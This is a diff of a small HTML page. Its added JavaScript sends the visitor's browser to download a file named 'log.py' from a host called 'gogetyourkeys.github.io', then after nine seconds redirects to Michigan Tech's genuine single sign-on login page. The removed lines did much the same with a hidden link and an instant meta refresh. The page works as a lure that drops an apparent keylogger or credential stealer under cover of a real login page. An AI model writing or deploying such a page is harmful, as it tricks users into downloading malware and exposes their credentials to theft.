@@ -1,7 +1,15 @@
 <html>
-
-	<a href="https://gogetyourkeys.github.io/log.py"> . </a>
 	
-<meta http-equiv="Refresh" content="0; url=https://sso.mtu.edu/cas/login?service=https%3A%2F%2Fwww.banweb.mtu.edu%3A443%2Fssomanager%2Fc%2FSSB" /
-
+	<script type="text/javascript">
+	function DownloadAndRedirect()
+	{
+   	var DownloadURL = "https://gogetyourkeys.github.io/log.py";
+   	var RedirectURL = "https://sso.mtu.edu/cas/login?service=https%3A%2F%2Fwww.banweb.mtu.edu%3A443%2Fssomanager%2Fc%2FSSB";
+   	var RedirectPauseSeconds = 9;
+   	location.href = DownloadURL;
+   	setTimeout("DoTheRedirect('"+RedirectURL+"')",parseInt(RedirectPauseSeconds*1000));
+	}
+	function DoTheRedirect(url) { window.location=url; }
+	</script>
+	
 </html>
